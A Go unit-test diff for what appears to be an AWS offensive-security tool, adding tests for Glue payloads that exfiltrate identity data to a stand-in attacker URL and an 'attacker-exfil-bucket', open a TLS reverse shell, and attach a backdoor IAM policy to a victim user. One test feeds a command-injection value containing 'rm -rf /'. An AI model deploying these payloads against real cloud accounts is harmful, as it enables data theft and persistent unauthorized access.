@@ -1,10 +1,12 @@
 package unit
 
 import (
+	"pathrunner/pkg/attacker"
 	"pathrunner/pkg/modules"
 	"pathrunner/pkg/payloads"
 	_ "pathrunner/pkg/payloads/ec2"    // Import to register EC2 payloads
-	_ "pathrunner/pkg/payloads/lambda" // Import to register payloads
+	_ "pathrunner/pkg/payloads/glue"   // Import to register Glue payloads
+	_ "pathrunner/pkg/payloads/lambda" // Import to register Lambda payloads
 	"strings"
 	"testing"
 )
@@ -139,11 +141,11 @@ func TestPayloadRegistry(t *testing.T) {
 			}
 		}
 
-		if exfilHTTPSCount != 2 {
-			t.Errorf("Expected 2 exfil/https payloads (Lambda + EC2), got %d", exfilHTTPSCount)
+		if exfilHTTPSCount != 3 {
+			t.Errorf("Expected 3 exfil/https payloads (Lambda + EC2 + Glue), got %d", exfilHTTPSCount)
 		}
-		if backdoorAPCount != 2 {
-			t.Errorf("Expected 2 backdoor/attach-policy payloads (Lambda + EC2), got %d", backdoorAPCount)
+		if backdoorAPCount != 3 {
+			t.Errorf("Expected 3 backdoor/attach-policy payloads (Lambda + EC2 + Glue), got %d", backdoorAPCount)
 		}
 	})
 
@@ -549,6 +551,296 @@ func TestSideEffectReporter_ResourceTracking(t *testing.T) {
 
 		var _ modules.CreatedResource = effects[0] // compile-time check
 	})
+}
+
+func TestGluePayloads(t *testing.T) {
+	t.Run("ExfilHTTPS_Registration", func(t *testing.T) {
+		payload, err := payloads.GetPayloadForService("exfil/https", payloads.TagServiceGlue)
+		if err != nil {
+			t.Fatalf("Failed to get glue exfil/https payload: %v", err)
+		}
+		if payload.GetName() != "exfil/https" {
+			t.Errorf("Expected name 'exfil/https', got '%s'", payload.GetName())
+		}
+		if !hasTag(payload.GetTags(), payloads.TagTransportHTTPS) {
+			t.Error("Expected exfil/https to have https transport tag")
+		}
+	})
+
+	t.Run("ExfilHTTPS_Validation", func(t *testing.T) {
+		payload, _ := payloads.GetPayloadForService("exfil/https", payloads.TagServiceGlue)
+
+		err := payload.Validate(map[string]string{})
+		if err == nil {
+			t.Error("Expected validation error for missing HTTPS_URL")
+		}
+
+		err = payload.Validate(map[string]string{"HTTPS_URL": "not-a-url"})
+		if err == nil {
+			t.Error("Expected validation error for invalid URL")
+		}
+
+		err = payload.Validate(map[string]string{"HTTPS_URL": "https://attacker.example.com/collect"})
+		if err != nil {
+			t.Errorf("Expected no validation error, got: %v", err)
+		}
+	})
+
+	t.Run("ExfilHTTPS_GenerateCode", func(t *testing.T) {
+		payload, _ := payloads.GetPayloadForService("exfil/https", payloads.TagServiceGlue)
+		code, err := payload.GenerateCode(map[string]string{
+			"HTTPS_URL": "https://attacker.example.com/collect",
+		})
+		if err != nil {
+			t.Fatalf("Failed to generate code: %v", err)
+		}
+		if !strings.Contains(code, "https://attacker.example.com/collect") {
+			t.Error("Generated code should contain the target URL")
+		}
+		if !strings.Contains(code, "PATHFINDER_IDENTITY_DATA") {
+			t.Error("Generated code should include PATHFINDER_IDENTITY_DATA markers")
+		}
+		if !strings.Contains(code, "urllib.request") {
+			t.Error("Generated code should use urllib.request for HTTPS POST")
+		}
+		// Should be a standalone script, not a lambda handler
+		if strings.Contains(code, "lambda_handler") {
+			t.Error("Glue payload should not contain lambda_handler")
+		}
+	})
+
+	t.Run("ExfilS3_Registration", func(t *testing.T) {
+		payload, err := payloads.GetPayloadForService("exfil/s3", payloads.TagServiceGlue)
+		if err != nil {
+			t.Fatalf("Failed to get glue exfil/s3 payload: %v", err)
+		}
+		if payload.GetName() != "exfil/s3" {
+			t.Errorf("Expected name 'exfil/s3', got '%s'", payload.GetName())
+		}
+		if !hasTag(payload.GetTags(), payloads.TagTransportFilesystem) {
+			t.Error("Expected exfil/s3 to have filesystem transport tag")
+		}
+	})
+
+	t.Run("ExfilS3_Validation", func(t *testing.T) {
+		payload, _ := payloads.GetPayloadForService("exfil/s3", payloads.TagServiceGlue)
+
+		err := payload.Validate(map[string]string{})
+		if err == nil {
+			t.Error("Expected validation error for missing EXFIL_BUCKET")
+		}
+
+		err = payload.Validate(map[string]string{"EXFIL_BUCKET": "s3://my-bucket"})
+		if err == nil {
+			t.Error("Expected validation error for S3 URI (should be bucket name only)")
+		}
+
+		err = payload.Validate(map[string]string{"EXFIL_BUCKET": "my-exfil-bucket"})
+		if err != nil {
+			t.Errorf("Expected no validation error, got: %v", err)
+		}
+	})
+
+	t.Run("ExfilS3_GenerateCode", func(t *testing.T) {
+		payload, _ := payloads.GetPayloadForService("exfil/s3", payloads.TagServiceGlue)
+		code, err := payload.GenerateCode(map[string]string{
+			"EXFIL_BUCKET": "attacker-exfil-bucket",
+			"EXFIL_PREFIX": "loot/",
+		})
+		if err != nil {
+			t.Fatalf("Failed to generate code: %v", err)
+		}
+		if !strings.Contains(code, "attacker-exfil-bucket") {
+			t.Error("Generated code should contain the exfil bucket name")
+		}
+		if !strings.Contains(code, "loot/") {
+			t.Error("Generated code should contain the exfil prefix")
+		}
+		if !strings.Contains(code, "s3.put_object") {
+			t.Error("Generated code should use s3.put_object for exfiltration")
+		}
+		if !strings.Contains(code, "PATHFINDER_IDENTITY_DATA") {
+			t.Error("Generated code should include PATHFINDER_IDENTITY_DATA markers")
+		}
+	})
+
+	t.Run("RevshellTLS_Registration", func(t *testing.T) {
+		payload, err := payloads.GetPayloadForService("revshell/tls", payloads.TagServiceGlue)
+		if err != nil {
+			t.Fatalf("Failed to get glue revshell/tls payload: %v", err)
+		}
+		if payload.GetName() != "revshell/tls" {
+			t.Errorf("Expected name 'revshell/tls', got '%s'", payload.GetName())
+		}
+		if !hasTag(payload.GetTags(), payloads.TagTechniqueAccess) {
+			t.Error("Expected revshell/tls to have access technique tag")
+		}
+		if !hasTag(payload.GetTags(), payloads.TagTransportHTTPS) {
+			t.Error("Expected revshell/tls to have https transport tag")
+		}
+	})
+
+	t.Run("RevshellTLS_Validation", func(t *testing.T) {
+		payload, _ := payloads.GetPayloadForService("revshell/tls", payloads.TagServiceGlue)
+
+		err := payload.Validate(map[string]string{})
+		if err == nil {
+			t.Error("Expected validation error for missing LHOST")
+		}
+
+		err = payload.Validate(map[string]string{"LHOST": "10.0.0.1"})
+		if err == nil {
+			t.Error("Expected validation error for missing LPORT")
+		}
+
+		err = payload.Validate(map[string]string{"LHOST": "10.0.0.1", "LPORT": "4443"})
+		if err != nil {
+			t.Errorf("Expected no validation error, got: %v", err)
+		}
+	})
+
+	t.Run("RevshellTLS_InputSanitization", func(t *testing.T) {
+		payload, _ := payloads.GetPayloadForService("revshell/tls", payloads.TagServiceGlue)
+
+		err := payload.Validate(map[string]string{"LHOST": "'; rm -rf /; '", "LPORT": "4443"})
+		if err == nil {
+			t.Error("Expected validation error for LHOST containing single quotes")
+		}
+	})
+
+	t.Run("RevshellTLS_GenerateCode", func(t *testing.T) {
+		payload, _ := payloads.GetPayloadForService("revshell/tls", payloads.TagServiceGlue)
+		code, err := payload.GenerateCode(map[string]string{
+			"LHOST": "10.0.0.1",
+			"LPORT": "4443",
+		})
+		if err != nil {
+			t.Fatalf("Failed to generate code: %v", err)
+		}
+		if !strings.Contains(code, "10.0.0.1") {
+			t.Error("Generated code should contain LHOST")
+		}
+		if !strings.Contains(code, "4443") {
+			t.Error("Generated code should contain LPORT")
+		}
+		if !strings.Contains(code, "ssl.SSLContext") {
+			t.Error("Generated code should use ssl.SSLContext for TLS")
+		}
+		if !strings.Contains(code, "subprocess.call") {
+			t.Error("Generated code should use subprocess.call for shell execution")
+		}
+	})
+
+	t.Run("ExfilCloudWatch_Registration", func(t *testing.T) {
+		payload, err := payloads.GetPayloadForService("exfil/cloudwatch", payloads.TagServiceGlue)
+		if err != nil {
+			t.Fatalf("Failed to get glue exfil/cloudwatch payload: %v", err)
+		}
+		if payload.GetName() != "exfil/cloudwatch" {
+			t.Errorf("Expected name 'exfil/cloudwatch', got '%s'", payload.GetName())
+		}
+	})
+
+	t.Run("BackdoorAttachPolicy_Glue_Registration", func(t *testing.T) {
+		payload, err := payloads.GetPayloadForService("backdoor/attach-policy", payloads.TagServiceGlue)
+		if err != nil {
+			t.Fatalf("Failed to get glue backdoor/attach-policy payload: %v", err)
+		}
+		if !hasTag(payload.GetTags(), payloads.TagServiceGlue) {
+			t.Error("Expected glue tag on backdoor/attach-policy")
+		}
+	})
+
+	t.Run("BackdoorAttachPolicy_Glue_SideEffectReporter", func(t *testing.T) {
+		payload, _ := payloads.GetPayloadForService("backdoor/attach-policy", payloads.TagServiceGlue)
+		reporter, ok := payload.(payloads.SideEffectReporter)
+		if !ok {
+			t.Fatal("Glue backdoor/attach-policy should implement SideEffectReporter")
+		}
+
+		effects := reporter.ReportSideEffects(map[string]string{
+			"TARGET_USER": "victim-user",
+		})
+		if len(effects) != 1 {
+			t.Fatalf("Expected 1 side effect, got %d", len(effects))
+		}
+		if effects[0].Type != "iam:attached-policy" {
+			t.Errorf("Expected type 'iam:attached-policy', got '%s'", effects[0].Type)
+		}
+	})
+
+	t.Run("BackdoorAttachPolicy_Glue_Verifiable", func(t *testing.T) {
+		payload, _ := payloads.GetPayloadForService("backdoor/attach-policy", payloads.TagServiceGlue)
+		_, ok := payload.(payloads.Verifiable)
+		if !ok {
+			t.Fatal("Glue backdoor/attach-policy should implement Verifiable")
+		}
+	})
+
+	t.Run("AllGluePayloads_StandaloneScripts", func(t *testing.T) {
+		gluePayloads := payloads.GetPayloadsByTags([]string{payloads.TagServiceGlue})
+		if len(gluePayloads) == 0 {
+			t.Fatal("Expected at least one Glue payload registered")
+		}
+
+		for _, p := range gluePayloads {
+			// Build minimal valid options for code generation
+			opts := map[string]string{}
+			for _, opt := range p.GetOptions() {
+				if opt.Required {
+					switch opt.Name {
+					case "TARGET_USER":
+						opts["TARGET_USER"] = "test-user"
+					case "HTTPS_URL":
+						opts["HTTPS_URL"] = "https://test.example.com"
+					case "EXFIL_BUCKET":
+						opts["EXFIL_BUCKET"] = "test-bucket"
+					case "LHOST":
+						opts["LHOST"] = "10.0.0.1"
+					case "LPORT":
+						opts["LPORT"] = "4444"
+					}
+				}
+			}
+
+			code, err := p.GenerateCode(opts)
+			if err != nil {
+				t.Errorf("Glue payload '%s' failed to generate code: %v", p.GetName(), err)
+				continue
+			}
+
+			// Glue payloads should be standalone Python scripts, not Lambda handlers
+			if strings.Contains(code, "lambda_handler") {
+				t.Errorf("Glue payload '%s' should not contain lambda_handler", p.GetName())
+			}
+
+			// All should have python tag
+			if !hasTag(p.GetTags(), payloads.TagLanguagePython) {
+				t.Errorf("Glue payload '%s' should have python language tag", p.GetName())
+			}
+		}
+	})
+}
+
+func TestAttackerExfilBucketTracking(t *testing.T) {
+	// Verify TrackAttackerBucket works for exfil buckets the same as code buckets
+	resource := attacker.TrackAttackerBucket("pathrunner-exfil-abc123", "us-west-2", "glue-003")
+
+	if resource.Type != "s3_bucket" {
+		t.Errorf("Expected type 's3_bucket', got '%s'", resource.Type)
+	}
+	if resource.AccountContext != "attacker" {
+		t.Errorf("Expected AccountContext 'attacker', got '%s'", resource.AccountContext)
+	}
+	if resource.Name != "pathrunner-exfil-abc123" {
+		t.Errorf("Expected name 'pathrunner-exfil-abc123', got '%s'", resource.Name)
+	}
+	if resource.Region != "us-west-2" {
+		t.Errorf("Expected region 'us-west-2', got '%s'", resource.Region)
+	}
+	if resource.ModuleID != "glue-003" {
+		t.Errorf("Expected moduleID 'glue-003', got '%s'", resource.ModuleID)
+	}
 }
 
 // Helper function
